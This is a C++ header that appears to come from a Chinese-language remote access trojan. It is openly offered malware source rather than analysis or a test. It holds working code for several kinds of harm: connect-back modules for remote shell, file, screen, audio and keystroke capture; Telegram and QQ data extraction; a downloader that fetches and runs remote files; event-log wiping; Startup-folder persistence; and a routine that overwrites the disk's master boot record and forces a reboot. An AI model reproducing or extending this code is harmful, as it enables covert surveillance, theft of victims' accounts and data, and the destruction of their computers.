#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED

#include "../StdAfx.h"
#include "../Declare.h"   //动态调用库函数
#include "until.h"
#include <shlobj.h>
#include "AudioManager.h"
#include "Filemanager.h"
#include "RegManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
/*#include "VideoManager.h"*/
#include "keylog.h"
#include "SerManager.h"
#include "KeyboardManager.h"
#include "SystemManager.h"
#include "ChatManager.h"
#include "QQInfoManager.h"
#include "SysInfo.h"
#include "DllManager.h"
#include "MyGnonen.h"
#include <wininet.h>
#include <tlhelp32.h>
#include <winioctl.h>   //硬盘毁灭文件
#include "../Myfunction.h"  //自定义函数
#include <tchar.h>
#include <mmsystem.h>
#pragma comment(lib, "winmm.lib")
#include "TelegramManager.h"

extern Myfunction *pMyfunction;
extern bool g_bSignalHook;
extern HANDLE hNewThreadInitializedEvent;

extern FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);
extern bool OpenFile1(LPCTSTR lpFile, BOOL bRunInAcsiUser, INT nShowCmd);
extern BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);

struct threadInfo
{  
	char m_strMasterHost[260];
	UINT m_nMasterPort;
};

bool OpenUrl(LPBYTE sRemote, INT nShowCmd)
{
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char KoX3m[]={'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)MyGetProcAddressA(AjrFx,KoX3m);
	
	char jIomR[]={'R','e','g','Q','u','e','r','y','V','a','l','u','e','A','\0'};
	RegQueryValueAT pRegQueryValueA=(RegQueryValueAT)MyGetProcAddressA(AjrFx,jIomR);
	
	char fZkmT[]={'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)MyGetProcAddressA(AjrFx,fZkmT);
	
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR,wSuTs);
	
	char oIksN[]={'W','T','S','A','P','I','3','2','.','d','l','l','\0'};
	char xAsDm[]={'W','T','S','Q','u','e','r','y','U','s','e','r','T','o','k','e','n','\0'};
	typedef BOOL (WINAPI *WTSQueryUserTokenT)(ULONG SessionId,PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken=(WTSQueryUserTokenT)MyGetProcAddressA(oIksN,xAsDm);
	
	char rAtzT[]={'C','r','e','a','t','e','P','r','o','c','e','s','s','A','s','U','s','e','r','A','\0'};
	CreateProcessAsUserAT pCreateProcessAsUserA=(CreateProcessAsUserAT)MyGetProcAddressA(AjrFx,rAtzT);
	
	int		nUrlLength;
	char	*lpUrl = NULL;
	char	lpSubKey[512];
	HKEY	hKey;
	char	strTemp[1024];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	nUrlLength = pMyfunction->my_strlen((char *)sRemote);
	if (nUrlLength == 0)
		return false;
	
	lpUrl = (char *)malloc(nUrlLength + 1);
	pMyfunction->my_memcpy(lpUrl, sRemote, nUrlLength + 1);
	SetEvent(hNewThreadInitializedEvent);
	
	char szUserName[UNLEN+1];
	DWORD dwUserLen = UNLEN;
	GetUserName(szUserName, &dwUserLen);
	if (stricmp(szUserName, "SYSTEM") == 0)
	{
		while (lpszUserSid == NULL)
			Sleep(100);
	}
	
	if (lpszUserSid != NULL)
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		if (nShowCmd == SW_SHOW)
			sprintf(lpSubKey, "%s_Classes\\%s\\shell\\open\\command", lpszUserSid, "http");
		else
			sprintf(lpSubKey, "%s_Classes\\%s\\shell\\open\\command", lpszUserSid, "Applications\\iexplore.exe");
		if (pRegOpenKeyExA(HKEY_USERS, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			memset(lpSubKey, 0, sizeof(lpSubKey));
			if (nShowCmd == SW_SHOW)
				sprintf(lpSubKey, "%s\\shell\\open\\command", "http");
			else
				sprintf(lpSubKey, "%s\\shell\\open\\command", "Applications\\iexplore.exe");
			if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
			{
				if (lpUrl)
					free(lpUrl);
				return false;
			}
		}
	}
	else
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		if (nShowCmd == SW_SHOW)
			sprintf(lpSubKey, "%s\\shell\\open\\command", "http");
		else
			sprintf(lpSubKey, "%s\\shell\\open\\command", "Applications\\iexplore.exe");
		if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			if (lpUrl)
				free(lpUrl);
			return false;
		}
	}
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	pRegQueryValueA(hKey, NULL, strTemp, &nSize);
	pRegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpUrl);
	}
	else
		lstrcpy(lpstrCat, lpUrl);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = nShowCmd;
	DWORD	dwSessionId = 0;
	HANDLE	hTokenAcsi = NULL;
	
	if (stricmp(szUserName, "SYSTEM") == 0)
	{
		dwSessionId = pWTSGetActiveConsoleSessionId();
		if (dwSessionId == 0xFFFFFFFF)
		{
			if (lpUrl)
				free(lpUrl);
			return false;
		}
		if (!pWTSQueryUserToken(dwSessionId, &hTokenAcsi))
		{
			if (lpUrl)
				free(lpUrl);
			return false;
		}
	}
	
	if (!pCreateProcessAsUserA(hTokenAcsi, NULL, strTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		if (hTokenAcsi)
			CloseHandle(hTokenAcsi);
		if (lpUrl)
			free(lpUrl);
		return false;
	}
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	if (hTokenAcsi)
		CloseHandle(hTokenAcsi);
	if (lpUrl)
		free(lpUrl);
	return true;
}

//////////////////////////////////////////////////////////////////////////
//文件管理
DWORD WINAPI Loop_FileManager(LPBYTE sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

//远程终端
DWORD WINAPI Loop_ShellManager(LPBYTE sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

//桌面管理
DWORD WINAPI Loop_ScreenManager(LPBYTE sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

DWORD WINAPI Loop_DllManager(LPBYTE lparam)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CDllManager	manager(&socketClient,lparam);
	socketClient.run_event_loop();
	return 0;
}

//音频监听
DWORD WINAPI Loop_AudioManager(LPBYTE sRemote)
{
	if (!waveInGetNumDevs())  //读是否有录音设备
		return -1;
	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

//提取 T G
DWORD WINAPI Loop_TelegramManager(LPBYTE lparam)  
{  
    CClientSocket socketClient;  
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))  
        return -1;  
      
    CTelegramManager manager(&socketClient, lparam);  
    socketClient.run_event_loop();  
    return 0;  
}

//键盘记录

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)//键盘记录
{	
	
	CClientSocket	SocketClient;
	if (!SocketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&SocketClient);
	
	SocketClient.run_event_loop();
	
	return 0;
}

//系统管理
DWORD WINAPI Loop_SystemManager(LPBYTE sRemote)   
{	
	char NETLine = ConnectType;    //上线方式
	char NATOper = (char)InstallMode;  //运行模式
	char *Addressp = (char *)lpConnInfos[ConnectType];  //上线地址
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	manager(&socketClient,CKernelManager::m_nMasterPort, NETLine,NATOper,Addressp);
	socketClient.run_event_loop();
	return 0;
}

//注册表管理
DWORD WINAPI Loop_RegeditManager(LPBYTE sRemote)          
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CRegManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

//服务管理
DWORD WINAPI Loop_SerManager(LPBYTE sRemote)   
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSerManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

//主机管理
DWORD WINAPI Loop_SysInfoManager(SOCKET sRemote)
{
	char NETLine = ConnectType;    //上线方式
	char NATOper = (char)InstallMode;  //运行类型
	char *Addressp = (char *)lpConnInfos[ConnectType];  //上线地址
	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSysInfo	manager(&socketClient,CKernelManager::m_nMasterPort, NETLine, NATOper, Addressp);
	socketClient.run_event_loop();
	return 0;
}

//远程交谈
DWORD WINAPI Loop_ChatManager(LPBYTE sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CChatManager	*manager = new CChatManager(&socketClient);
	socketClient.run_event_loop();
	delete manager;
	return 0;
}

//好友信息
DWORD WINAPI Loop_QQInfoManager(LPBYTE sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CQQInfoManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

//弹出消息框
void WINAPI Loop_MessageBox(LPVOID lParam)
{
	//发送消息
	struct MSGBOX
	{
		CHAR Title[200];
		CHAR szText[1000];
		UINT Type;
	}MsgBox;
	
	memcpy(&MsgBox,lParam,sizeof(MSGBOX));
	SetEvent(hNewThreadInitializedEvent);
	MessageBox(NULL,MsgBox.szText,MsgBox.Title,MsgBox.Type|MB_SYSTEMMODAL);
}

//显示打开网页
DWORD WINAPI Loop_OpenUrlShow(LPBYTE sRemote)
{
	return OpenUrl(sRemote, SW_SHOW);
// 	ShellExecute(NULL,"open",(LPCTSTR)sRemote,NULL,NULL,SW_SHOW);
// 	SetEvent(hNewThreadInitializedEvent);
}

//隐藏打开网页
DWORD WINAPI Loop_OpenUrlHide(LPBYTE sRemote)
{
	return OpenUrl(sRemote,SW_HIDE);
// 	ShellExecute(NULL,"open",(LPCTSTR)sRemote,NULL,NULL,SW_HIDE);
// 	SetEvent(hNewThreadInitializedEvent);
	return 0;
}

//进程筛选
BOOL SortUOP=NULL;
DWORD WINAPI Loop_SortProcess(LPVOID lparam)  
{
	_tcscpy(temp_proc,(LPTSTR)lparam);
//	OutputDebugString(temp_proc);
	if(EnumProcesin(temp_proc))
		return TRUE;
	else
		return NULL;
	return 0;
}

//窗体筛选
DWORD WINAPI Loop_SortWindow(LPVOID lparam)  
{
	_tcscpy(temp_proc,(LPTSTR)lparam);
//	OutputDebugString(temp_proc);
	EnumWindows(EnumWindowsList,0);
	if(proc_tag)
		return TRUE;
	else
		return NULL;
	return 0;
}

// 下载者
DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	char zFiOL[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char yUfMS[]={'G','e','t','T','e','m','p','P','a','t','h','A','\0'};
	typedef DWORD (WINAPI *GetTempPathAT)(DWORD nBufferLength,LPSTR lpBuffer);
	GetTempPathAT pGetTempPathA=(GetTempPathAT)GetProcAddress(LoadLibrary(zFiOL),yUfMS);
	
	char WFderi[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)GetProcAddress(LoadLibrary(zFiOL),WFderi);
	
	int		nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	char	lpFilePath[MAX_PATH];
	
	nUrlLength = pMyfunction->my_strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	pMyfunction->my_memcpy(lpURL, lparam, nUrlLength + 1);
	SetEvent(hNewThreadInitializedEvent);
	lpFileName = pMyfunction->my_strrchr(lpURL, '/');
	if (lpFileName == NULL)
	{
		free(lpURL);
		return false;
	}
	
	pGetTempPathA(sizeof(lpFilePath), lpFilePath);
	pMyfunction->my_strcat(lpFilePath, ++lpFileName);
	if (!http_get(lpURL, lpFilePath))
	{
		free(lpURL);
		return false;
	}
	free(lpURL);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char ILHhrv[] = {'W','i','n','S','t','a','0','\\','D','e','f','a','u','l','t','\0'};
	si.lpDesktop = ILHhrv;
	return OpenFile1(lpFilePath, FALSE, SW_SHOW);
	//return pCreateProcessA(NULL, lpFilePath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

void CleanEvent()
{
	char *strEventName[] = {"Application", "Security", "System"};
	
	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}

void SetHostID(LPCTSTR lpHostID)
{
	HKEY   hKey;
	if (RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Setup", &hKey) == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, "Host", 0, REG_SZ, (LPBYTE)lpHostID, strlen(lpHostID) + 1);
		RegCloseKey(hKey);
	}
}

/*---------------------------硬盘炸弹----------------------------*/

// unsigned char mbrscode[] = // 包含QQ留言
// "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
// "\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x47\x61\x6d\x65\x20\x4f\x76\x65"
// "\x72\x20\x51\x51\x20\x3a\x20\x38\x35\x30\x36\x35\x38\x35\x36";
unsigned char mbrscode[] = // 不含QQ留言
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe";

int KillMBR(BOOL bLeaveQQ)
{
//	ExitWindowsExT   pExitWindowsEx =  (ExitWindowsExT)GetProcAddress(LoadLibrary("USER32.dll"), "ExitWindowsEx");
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};
	
	// 重新构造MBR
	if (bLeaveQQ)   // 留下QQ
		memcpy(pMBR, mbrscode, sizeof(mbrscode) - 1);
	else            // 不留QQ
		memcpy(pMBR, mbrscode, sizeof(mbrscode) - 23 - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	
	// 写入病毒内容
	hDevice = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	CloseHandle(hDevice);
	Sleep(2000);
	
	// 重新启动电脑
	DWORD dwVersion = GetVersion();
	if (dwVersion < 0x80000000)   // Is NT or 2000!
	{
		EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);
		ExitWindowsEx(EWX_FORCE+EWX_REBOOT, 0);
	}
	else   // Is 9x or Me!
	{
		ExitWindowsEx(EWX_FORCE+EWX_REBOOT, 0);
	}
	ExitProcess(-1);
	return 0;
}

void WINAPI Loop_PrankControl(LPVOID lparam)
{
	DWORD dwType = (DWORD)lparam;
	SetEvent(hNewThreadInitializedEvent);
	
	switch(dwType)
	{
	case COMMAND_KILLMBR:
		KillMBR(TRUE); //硬盘炸弹
		break;
	case COMMAND_ZHUOMIAN1:
		{
			HWND disk;
			disk = FindWindow("Progman",NULL);
			ShowWindow(disk,SW_HIDE); //隐藏桌面
		}
		break;
	case COMMAND_ZHUOMIAN2:
		{
			HWND disk;
			disk=FindWindow("Progman",NULL);
			ShowWindow(disk,SW_SHOW); //显示桌面
		}
		break;
	case COMMAND_RENWULAN1:
		{
			HWND mask;
			mask=FindWindow("Shell_TrayWnd",NULL);
			ShowWindow(mask,SW_HIDE); //隐藏任务栏
			mask=FindWindow("Button","开始");
			ShowWindow(mask,SW_HIDE); //隐藏开始按钮
		}
		break;
	case COMMAND_RENWULAN2:
		{
			HWND mask;
			mask=FindWindow("Shell_TrayWnd",NULL);
			ShowWindow(mask,SW_SHOW); //显示任务栏
			mask=FindWindow("Button","开始");
			ShowWindow(mask,SW_SHOW); //显示开始按钮
		}
		break;
	case COMMAND_XIANSHIQI1:
		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,2);  //关闭显示器
		break;
	case COMMAND_XIANSHIQI2:
		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,-1); //打开显示器
		break;
	case COMMAND_GUANGQU1:
		::mciSendString("set cdaudio door open",NULL,0,NULL);          //打开光驱
		break;
	case COMMAND_GUANGQU2:
		::mciSendString("set cdaudio door closed wait",NULL,0,NULL);   //关闭光驱
		break;
	case COMMAND_ZAOYIN:
		{
			for(int i=1000;i<1050;i++)
			{
				Beep(i,30);
				::Sleep(100);
			}
		}
		break;
	case COMMAND_SHANPIN:
		{
			HWND ForeHandle=GetForegroundWindow();
			for(int i=0;i<15;i++)
			{
				RECT rc;
				GetWindowRect(ForeHandle,&rc);
				MoveWindow(ForeHandle,rc.left+8,rc.top+8,rc.right-rc.left,rc.bottom-rc.top,1);
				Sleep(40);
				MoveWindow(ForeHandle,rc.left,rc.top,rc.right-rc.left,rc.bottom-rc.top,1);
				Sleep(40);
				Beep(0x0fff,10);
			}
		}
		break;
	case COMMAND_MOUSE1:
		SwapMouseButton(true);  //交换鼠标
		break;
	case COMMAND_MOUSE2:
		SwapMouseButton(false); //恢复鼠标
		break;
	default:
		return;
	}
}

DWORD WINAPI Loop_Screen()
{	
	//获取分辨率  
	int _cx = ::GetSystemMetrics(SM_CXSCREEN);   
	int _cy = ::GetSystemMetrics(SM_CYSCREEN);  
	
	//修改分辨率  
	DEVMODE lpDevMode;  
	lpDevMode.dmBitsPerPel = 32;//每个像素的位数  
	lpDevMode.dmPelsWidth = 1600;//屏幕宽度（像素）  
	lpDevMode.dmPelsHeight = 900;//屏幕高度（像素）  
	lpDevMode.dmSize = sizeof(lpDevMode);  
	lpDevMode.dmFields =   
		DM_PELSWIDTH/*使用dmPelsWidth的值*/  
		|DM_PELSHEIGHT/*使用dmPelsHeight的值*/  
		|DM_BITSPERPEL/*使用dmBitsPerPel的值*/;  
	//  
	LONG result = ChangeDisplaySettings(&lpDevMode, 0);  
	if (result == DISP_CHANGE_SUCCESSFUL)  
	{  
		//			MessageBox(NULL, L"修改成功！", L"Tip", MB_OK);  
		ChangeDisplaySettings(&lpDevMode, CDS_UPDATEREGISTRY);//CDS_UPDATEREGISTRY表示次修改是持久的，并在注册表中写入了相关的数据  
	}  
	else  
	{  
		//			MessageBox(NULL, L"修改失败，恢复原有设置！", L"Tip", MB_OK);  
		ChangeDisplaySettings(NULL,0);  
	}  
	return 0;
}

//结构体
struct START
{
	CHAR Startname[200];
	WORD FileAttribute;      //文件属性	
	WORD Enlarge;            //安装增大
}Start;

///////////////////////////////////////////////////////////////////////////////////
VOID Wj_OnButtonAdd(LPSTR Path)  //文件加大函数  Path 文件名
{
	HMODULE hDll;
	hDll = LoadLibrary("KERNEL32.dll");
	if(Start.Enlarge == 0)  //安装不增大
		return ;
	
	
	int m_Size=Start.Enlarge;  //m_Size=10 就是10M
	DWORD dwSize = m_Size * 1024;
	DWORD iSize; 
	
	HANDLE hFile = CreateFile
		(
		Path, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	if(hFile==INVALID_HANDLE_VALUE)  //失败
		return;
	
	
	SetFilePointer(hFile,0,NULL,FILE_END);
    iSize = GetFileSize(hFile,NULL);  
	if((dwSize*1024)>iSize)  //判断文件是否过大 防止服务端程序多次点击运行
	{  
		
		DWORD dwBytes=NULL;
		CHAR Buffer[1024]={NULL};
		for (DWORD n=0;n<dwSize;n++)
		{
			if(n%1024==0){
				for (int x=0;x<1024;x++)
					Buffer[x]=(char)(rand()+x)%255;    //写入随机垃圾数据
			}
			
			WriteFile(hFile,Buffer,1024,&dwBytes,NULL);
		}
	}
	CloseHandle(hFile);	
}

void WINAPI Loop_Start(LPVOID lParam)
{
	memcpy(&Start,lParam,sizeof(START));
	////获取小马路径
	char	strInstallModule[MAX_PATH]; 
	memset(strInstallModule, 0, sizeof(strInstallModule)); 
	GetModuleFileName(NULL,strInstallModule,sizeof(strInstallModule));
	TCHAR   szPath[MAX_PATH];
	if (!SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE))
	{
		return ;
	}
	char FileName[80];
	
	wsprintf(FileName,"%s.exe",Start.Startname);
	
	TCHAR buf[MAX_PATH], buf2[MAX_PATH];
	wsprintf(buf, "%s\\%s", szPath, FileName);
	
	if (GetFileAttributes(buf) == -1)
	{
		wsprintf(buf2, "%s\\%s", szPath, FileName);
		Sleep(100);
		CopyFile(strInstallModule,buf2,FALSE);//拷贝自身文件
		MoveFileEx(strInstallModule, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
		CreateDirectory(szPath, NULL);
		Wj_OnButtonAdd(buf2);  //文件增大
		SetFileAttributes(buf2,Start.FileAttribute);
	}
} 
/////////////////////////////////////////////////////////////////////////////

#include "ProxyManager.h"
DWORD WINAPI Loop_ProxyManager(SOCKET sRemote)//Proxy
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CProxyManager	manager(&socketClient);
	socketClient.run_event_loop();
	
	return 0;
}
/////////////////////////////////////////////////////////////////////////////////
//检查系统版本是否是Vista或更高的版本  
bool   IsOsVersionVistaOrGreater()  
{  
    OSVERSIONINFOEX    ovex;    
    //设置参数的大小，调用并判断是否成功  
    ovex.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);  
    if( !GetVersionEx(  (LPOSVERSIONINFO) (&ovex)  )  )  
    {  
        //printf("检查系统版本失败\n");  
        return false;  
    }  
    //通过版本号，判断是否是vista及之后版本  
    if(ovex.dwMajorVersion > 5)  
    {  
        return true;   
    }  
    else  
    {  
        return false;  
    }  
} 

// void Win7Elevate_Privileges() //WIN7提升权限
DWORD WINAPI Win7Elevate_Privileges(LPVOID lParam)
{
	char ModuleFileNamePath[MAX_PATH]={0};
	GetModuleFileName(NULL,ModuleFileNamePath,MAX_PATH);
	scEXEName=ModuleFileNamePath;
	
	if(!IsOsVersionVistaOrGreater())  
		return 0;
	char szRundll32Path[MAX_PATH]={0};
	strcat(szRundll32Path,scEXEName);
	// 	OutputDebugString(szRundll32Path);
	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
	sei.lpVerb = TEXT("runas");
	sei.lpFile = szRundll32Path;
	//	sei.lpParameters =/* (LPCTSTR)*/sCmdLine;//参数
	sei.nShow = SW_SHOW;
	if(ShellExecuteEx(&sei))
		ExitProcess(0);
	return 0;
}
/////////////////////////////////////////////////////////////

DWORD WINAPI ReStartExp(LPVOID lParam)
{
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE  hSnapshot=NULL; 
	hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); 
	PROCESSENTRY32 pe={sizeof(PROCESSENTRY32)};//支持win7
	Process32First(hSnapshot,&pe); 
	do 
	{
		if(strcmpi(pe.szExeFile, "explorer.exe")==0)
		{
			HANDLE   hProcess; 
			hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID); 
			if   (hProcess) 
			{ 
				TerminateProcess(hProcess,0);//关闭进程 
			} 
		} 
	}   
	while(Process32Next(hSnapshot,&pe)); 
	CloseHandle(hSnapshot); 
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	return 0;
}

DWORD WINAPI ReStartieqc(LPVOID lParam)
{
	WinExec("cmd.exe /c RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255", SW_HIDE);
	return 0;
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
